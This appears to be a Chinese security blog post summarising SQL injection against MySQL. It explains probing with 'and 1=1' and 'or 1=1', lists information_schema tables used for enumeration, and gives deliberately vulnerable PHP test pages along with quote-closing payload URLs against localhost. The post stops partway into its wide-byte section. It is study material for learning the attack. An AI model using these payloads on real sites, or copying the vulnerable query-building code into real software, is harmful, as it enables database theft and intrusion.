<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        SQL注入总结 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试是否有注入点"><span class="toc-text">测试是否有注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识准备"><span class="toc-text">知识准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql全局变量"><span class="toc-text">mysql全局变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#默认数据库"><span class="toc-text">默认数据库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用的函数"><span class="toc-text">常用的函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入分类"><span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#注入流程"><span class="toc-text">注入流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#整型注入"><span class="toc-text">整型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符型注入"><span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入"><span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入防御"><span class="toc-text">宽字节注入防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方"><span class="toc-text">利用方</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于时间的布尔盲注"><span class="toc-text">基于时间的布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔型注入"><span class="toc-text">布尔型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询注入"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆叠注入"><span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#说白了就是用分号可以执行多条语句"><span class="toc-text">说白了就是用分号可以执行多条语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#局限性"><span class="toc-text">局限性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二次注入"><span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert、update等其他语句的注入"><span class="toc-text">insert、update等其他语句的注入</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        SQL注入总结
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-04-02 13:44:28</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#OWASP-TOP-10" title="OWASP-TOP-10">OWASP-TOP-10</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>OWASP TOP 10漏洞—SQL注入<br><a id="more"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
<p>这段话比较官方，简单的来说，通过输出恶意的参数去让服务器执行我们想要执行的sql语句</p>
<h3 id="测试是否有注入点"><a href="#测试是否有注入点" class="headerlink" title="测试是否有注入点"></a>测试是否有注入点</h3><p>常用方法就是在参数（如ID等）后面加单引号/双引号/百分号等，若页面 有报错或者是不一样的回显，那么则判断存在SQL注入</p>
<p>另一种是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">or 1=1</span><br><span class="line">or 1=2</span><br></pre></td></tr></table></figure></p>
<p>再判断页面的回显</p>
<h3 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h3><h4 id="mysql全局变量"><a href="#mysql全局变量" class="headerlink" title="mysql全局变量"></a>mysql全局变量</h4><p>mysql中常见的全局变量，查看方法：show GLOBAL VARIABLES;  可以查到很多，我下面列举点常用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| datadir                                                | /var/lib/mysql/</span><br><span class="line">| port                                                   | 3306</span><br><span class="line">| version                                                | 5.6.30-1-log</span><br><span class="line">| user                                                   |root</span><br><span class="line">| database                                               |当前所在的数据库</span><br></pre></td></tr></table></figure></p>
<p>以上的全局变量都可以使用select语句查询到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user();</span><br><span class="line">select database();</span><br><span class="line">select @version();</span><br></pre></td></tr></table></figure></p>
<h4 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h4><p>在mysql数据库中，默认的数据库有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p>
<p>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。存储这所有表的信息，表有如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| CHARACTER_SETS                        |</span><br><span class="line">| COLLATIONS                            |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">| COLUMN_PRIVILEGES                     |</span><br><span class="line">| ENGINES                               |</span><br><span class="line">| EVENTS                                |</span><br><span class="line">| FILES                                 |</span><br><span class="line">| GLOBAL_STATUS                         |</span><br><span class="line">| GLOBAL_VARIABLES                      |</span><br><span class="line">| KEY_COLUMN_USAGE                      |</span><br><span class="line">| OPTIMIZER_TRACE                       |</span><br><span class="line">| PARAMETERS                            |</span><br><span class="line">| PARTITIONS                            |</span><br><span class="line">| PLUGINS                               |</span><br><span class="line">| PROCESSLIST                           |</span><br><span class="line">| PROFILING                             |</span><br><span class="line">| REFERENTIAL_CONSTRAINTS               |</span><br><span class="line">| ROUTINES                              |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| SCHEMA_PRIVILEGES                     |</span><br><span class="line">| SESSION_STATUS                        |</span><br><span class="line">| SESSION_VARIABLES                     |</span><br><span class="line">| STATISTICS                            |</span><br><span class="line">| TABLES                                |</span><br><span class="line">| TABLESPACES                           |</span><br><span class="line">| TABLE_CONSTRAINTS                     |</span><br><span class="line">| TABLE_PRIVILEGES                      |</span><br><span class="line">| TRIGGERS                              |</span><br><span class="line">| USER_PRIVILEGES                       |</span><br><span class="line">| VIEWS                                 |</span><br><span class="line">| INNODB_LOCKS                          |</span><br><span class="line">| INNODB_TRX                            |</span><br><span class="line">| INNODB_SYS_DATAFILES                  |</span><br><span class="line">| INNODB_LOCK_WAITS                     |</span><br><span class="line">| INNODB_SYS_TABLESTATS                 |</span><br><span class="line">| INNODB_CMP                            |</span><br><span class="line">| INNODB_METRICS                        |</span><br><span class="line">| INNODB_CMP_RESET                      |</span><br><span class="line">| INNODB_CMP_PER_INDEX                  |</span><br><span class="line">| INNODB_CMPMEM_RESET                   |</span><br><span class="line">| INNODB_FT_DELETED                     |</span><br><span class="line">| INNODB_BUFFER_PAGE_LRU                |</span><br><span class="line">| INNODB_SYS_FOREIGN                    |</span><br><span class="line">| INNODB_SYS_COLUMNS                    |</span><br><span class="line">| INNODB_SYS_INDEXES                    |</span><br><span class="line">| INNODB_FT_DEFAULT_STOPWORD            |</span><br><span class="line">| INNODB_SYS_FIELDS                     |</span><br><span class="line">| INNODB_CMP_PER_INDEX_RESET            |</span><br><span class="line">| INNODB_BUFFER_PAGE                    |</span><br><span class="line">| INNODB_CMPMEM                         |</span><br><span class="line">| INNODB_FT_INDEX_TABLE                 |</span><br><span class="line">| INNODB_FT_BEING_DELETED               |</span><br><span class="line">| INNODB_SYS_TABLESPACES                |</span><br><span class="line">| INNODB_FT_INDEX_CACHE                 |</span><br><span class="line">| INNODB_SYS_FOREIGN_COLS               |</span><br><span class="line">| INNODB_SYS_TABLES                     |</span><br><span class="line">| INNODB_BUFFER_POOL_STATS              |</span><br><span class="line">| INNODB_FT_CONFIG                      |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">59 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p>
<p>目前我在sql注入中用到的只有COLUMNS、TABLES、schemata这两个</p>
<p>COLUMNS表中存储了所有表的字段信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from columns\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">           TABLE_CATALOG: def</span><br><span class="line">            TABLE_SCHEMA: information_schema</span><br><span class="line">              TABLE_NAME: CHARACTER_SETS</span><br><span class="line">             COLUMN_NAME: CHARACTER_SET_NAME</span><br><span class="line">        ORDINAL_POSITION: 1</span><br><span class="line">          COLUMN_DEFAULT: </span><br><span class="line">             IS_NULLABLE: NO</span><br><span class="line">               DATA_TYPE: varchar</span><br><span class="line">CHARACTER_MAXIMUM_LENGTH: 32</span><br><span class="line">  CHARACTER_OCTET_LENGTH: 96</span><br><span class="line">       NUMERIC_PRECISION: NULL</span><br><span class="line">           NUMERIC_SCALE: NULL</span><br><span class="line">      DATETIME_PRECISION: NULL</span><br><span class="line">      CHARACTER_SET_NAME: utf8</span><br><span class="line">          COLLATION_NAME: utf8_general_ci</span><br><span class="line">             COLUMN_TYPE: varchar(32)</span><br><span class="line">              COLUMN_KEY: </span><br><span class="line">                   EXTRA: </span><br><span class="line">              PRIVILEGES: select</span><br><span class="line">          COLUMN_COMMENT: </span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">           TABLE_CATALOG: def</span><br><span class="line">            TABLE_SCHEMA: information_schema</span><br><span class="line">              TABLE_NAME: CHARACTER_SETS</span><br><span class="line">             COLUMN_NAME: DEFAULT_COLLATE_NAME</span><br><span class="line">        ORDINAL_POSITION: 2</span><br><span class="line">          COLUMN_DEFAULT: </span><br><span class="line">             IS_NULLABLE: NO</span><br><span class="line">               DATA_TYPE: varchar</span><br><span class="line">CHARACTER_MAXIMUM_LENGTH: 32</span><br><span class="line">  CHARACTER_OCTET_LENGTH: 96</span><br><span class="line">       NUMERIC_PRECISION: NULL</span><br><span class="line">           NUMERIC_SCALE: NULL</span><br><span class="line">      DATETIME_PRECISION: NULL</span><br><span class="line">      CHARACTER_SET_NAME: utf8</span><br><span class="line">          COLLATION_NAME: utf8_general_ci</span><br><span class="line">             COLUMN_TYPE: varchar(32)</span><br><span class="line">              COLUMN_KEY: </span><br><span class="line">                   EXTRA: </span><br><span class="line">              PRIVILEGES: select</span><br><span class="line">          COLUMN_COMMENT:</span><br></pre></td></tr></table></figure></p>
<p>用到的字段有table_name、table_schema、column_name</p>
<p>TABLES表中存储了数据库中所有标的信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tables\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">  TABLE_CATALOG: def</span><br><span class="line">   TABLE_SCHEMA: information_schema</span><br><span class="line">     TABLE_NAME: CHARACTER_SETS</span><br><span class="line">     TABLE_TYPE: SYSTEM VIEW</span><br><span class="line">         ENGINE: MEMORY</span><br><span class="line">        VERSION: 10</span><br><span class="line">     ROW_FORMAT: Fixed</span><br><span class="line">     TABLE_ROWS: NULL</span><br><span class="line"> AVG_ROW_LENGTH: 384</span><br><span class="line">    DATA_LENGTH: 0</span><br><span class="line">MAX_DATA_LENGTH: 16434816</span><br><span class="line">   INDEX_LENGTH: 0</span><br><span class="line">      DATA_FREE: 0</span><br><span class="line"> AUTO_INCREMENT: NULL</span><br><span class="line">    CREATE_TIME: 2019-04-01 21:30:19</span><br><span class="line">    UPDATE_TIME: NULL</span><br><span class="line">     CHECK_TIME: NULL</span><br><span class="line">TABLE_COLLATION: utf8_general_ci</span><br><span class="line">       CHECKSUM: NULL</span><br><span class="line"> CREATE_OPTIONS: max_rows=43690</span><br><span class="line">  TABLE_COMMENT: </span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">  TABLE_CATALOG: def</span><br><span class="line">   TABLE_SCHEMA: information_schema</span><br><span class="line">     TABLE_NAME: COLLATIONS</span><br><span class="line">     TABLE_TYPE: SYSTEM VIEW</span><br><span class="line">         ENGINE: MEMORY</span><br><span class="line">        VERSION: 10</span><br><span class="line">     ROW_FORMAT: Fixed</span><br><span class="line">     TABLE_ROWS: NULL</span><br><span class="line"> AVG_ROW_LENGTH: 231</span><br><span class="line">    DATA_LENGTH: 0</span><br><span class="line">MAX_DATA_LENGTH: 16704765</span><br><span class="line">   INDEX_LENGTH: 0</span><br><span class="line">      DATA_FREE: 0</span><br><span class="line"> AUTO_INCREMENT: NULL</span><br><span class="line">    CREATE_TIME: 2019-04-01 21:30:19</span><br><span class="line">    UPDATE_TIME: NULL</span><br><span class="line">     CHECK_TIME: NULL</span><br><span class="line">TABLE_COLLATION: utf8_general_ci</span><br><span class="line">       CHECKSUM: NULL</span><br><span class="line"> CREATE_OPTIONS: max_rows=72628</span><br><span class="line">  TABLE_COMMENT:</span><br></pre></td></tr></table></figure></p>
<p>schemata中存储这所有的数据库的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from schemata;</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">left(m,n) #从左向右截取字符串m返回前n位</span><br><span class="line">substr(m,1,2) #取字符串m从左面第一位起，2字节唱的字符串</span><br><span class="line">ascii(m) #返回字符m的ASCII码</span><br><span class="line">if(str1,str2,str3) #如果str1正确就执行str2，否则执行str3</span><br><span class="line">sleep(m) #使程序暂停几秒</span><br><span class="line">length(m) #返回字符串m的长度</span><br><span class="line">count(column_name) #返回指定列的值的数目</span><br><span class="line">concat(username,0x23,passwd) #是联合两个字段名</span><br><span class="line">group_concat() #与concat()用法是类似的，优点可以实现一次注出多组数据</span><br></pre></td></tr></table></figure>
<h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><ul>
<li>根据字符类型分类<br>– 整型注入<br>– 字符型注入<br>– 宽字节注入</li>
<li>根据注入方法分类<br>– 报错注入<br>– 基于时间的bool盲注<br>– 布尔型注入<br>– 联合查询注入<br>– 堆叠注入<br>– 二次注入<br>– insert、update等其他语句的注入</li>
</ul>
<h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><ul>
<li><p>判断是否又注入<br>– 在id后加单引号，发现有报错<br>– and 1=1 和and 1=2 的页面回显不同</p>
</li>
<li><p>判断是哪种注入方式（没什么技巧，全靠测试）</p>
</li>
<li>通过information_schema.tables来查表名</li>
<li>通过information_schema.columns来查列名</li>
<li>通过查出来的表名和列明来查询表中的数据</li>
<li>若权限够大，可以向服务器中写木马</li>
</ul>
<h3 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a>整型注入</h3><p>所谓整型注入就是注入点参数是数字，可以直接注入，不用考虑单双引号闭不闭合的问题<br>测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$conn = mysql_connect(&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">if($conn)</span><br><span class="line">&#123;</span><br><span class="line">	echo mysql_errno().&quot;:&quot;.mysql_error();</span><br><span class="line">	die(&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	mysql_select_db(&quot;test&quot;);</span><br><span class="line">	mysql_query(&quot;set names utf8&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$id = isset($_GET[&apos;id&apos;])?$_GET[&apos;id&apos;]:1;</span><br><span class="line">$sql = &quot;select * from test_data where id=&#123;$id&#125;&quot;;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line">if($res)</span><br><span class="line">&#123;</span><br><span class="line">	$arr = mysql_fetch_row($res);</span><br><span class="line">	echo &quot;ID:&quot;.$arr[&apos;0&apos;];</span><br><span class="line">	echo &quot;&lt;br&gt;username:&quot;.$arr[&apos;1&apos;];</span><br><span class="line">	echo &quot;&lt;br&gt;password:&quot;.$arr[&apos;2&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo mysql_errno().&quot;:&quot;.mysql_error();</span><br><span class="line">	die(&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>用户可控的参数是$id,id列在数据库中是整数，所以不用加单双引号。那么我们就可以直接接上我们想要执行的sql语句即可</p>
<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>字符型注入就是用户可控的参数在sql语句中是字符串，所以注入的时候就需要先进行闭合字符串所加的单引号或者是双引号<br>测试代码：（基本同上，只是sql通过字符串来查找）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = isset($_GET[&apos;username&apos;])?$_GET[&apos;username&apos;]:&quot;radish&quot;;</span><br><span class="line">$sql = &quot;select * from test_data where username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br></pre></td></tr></table></figure></p>
<p>可以看到$username被带到sql语句中之后会加上单引号，若我们直接注入的话，sql语句是错误的，所以我们就要闭合前面的单双引号，注释后面的单双引号</p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1ndex.php?username=1&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">http://127.0.0.1/1ndex.php?username=1&apos; or 1=1--+</span><br><span class="line">http://127.0.0.1/1ndex.php?username=1&apos; or 1=1%23</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>在mysql中，#和“减减空格”是注释的意思</p>
</blockquote>
<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当数据库的字符集是gbk的时候，并且可控参数用了addslashes、mysql_escape_string等函数的时候，都会在参数中的单引号、双引号、反斜杠、NULL字符前面加上反斜杠来转义</p>
<ul>
<li>前题准备<br>– alter table test_data convert to character set GBK<br>– header(“Content-type:text/html;charset=gbk”);<br>– mysql_query(“set names gbk”);</li>
</ul>
<p>测试代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=gbk&quot;); </span><br><span class="line">$conn = mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;test&quot;);</span><br><span class="line">mysql_query(&quot;set names gbk&quot;);</span><br><span class="line">$username = isset($_GET[&apos;username&apos;])?$_GET[&apos;username&apos;]:&quot;radish&quot;;</span><br><span class="line">$username = addslashes($username);</span><br><span class="line">$sql = &quot;select * from test_data where username=&apos;&quot;.$username.&quot;&apos;&quot;;</span><br><span class="line">$res = mysql_query($sql);</span><br><span class="line">if($res)</span><br><span class="line">&#123;</span><br><span class="line">	$arr = mysql_fetch_row($res);</span><br><span class="line">	echo &quot;ID:&quot;.$arr[&apos;0&apos;];</span><br><span class="line">	echo &quot;&lt;br&gt;username:&quot;.$arr[&apos;1&apos;];</span><br><span class="line">	echo &quot;&lt;br&gt;password:&quot;.$arr[&apos;2&apos;];	</span><br><span class="line">	echo &quot;&lt;hr&gt;&lt;br&gt;sql: &quot;.$sql;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo mysql_errno().&quot;:&quot;.mysql_error();</span><br><span class="line">	die(&quot;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>当我们的参数加一个单双引号的时候<br><img src="https://s2.ax1x.com/2019/04/02/AyqDgJ.png" alt><br>可以看到参数中的单引号被加了反斜杠转义，现在就要想办法来绕过</p>
